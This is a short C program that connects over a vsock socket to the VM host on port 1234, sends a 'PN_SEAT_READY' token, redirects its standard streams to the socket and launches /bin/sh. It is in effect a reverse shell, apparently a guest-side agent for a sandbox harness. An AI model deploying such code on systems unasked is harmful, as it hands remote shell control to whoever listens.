#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>

int main(void) {
    int fd = socket(AF_VSOCK, SOCK_STREAM, 0);
    if (fd < 0) return 1;
    struct sockaddr_vm a;
    memset(&a, 0, sizeof a);
    a.svm_family = AF_VSOCK;
    a.svm_cid = 2;
    a.svm_port = 1234;
    if (connect(fd, (struct sockaddr *)&a, sizeof a) < 0) return 2;
    const char *ready = "PN_SEAT_READY\n";
    (void)write(fd, ready, strlen(ready));
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
    if (fd > 2) close(fd);
    execl("/bin/sh", "sh", (char *)0);
    return 3;
}
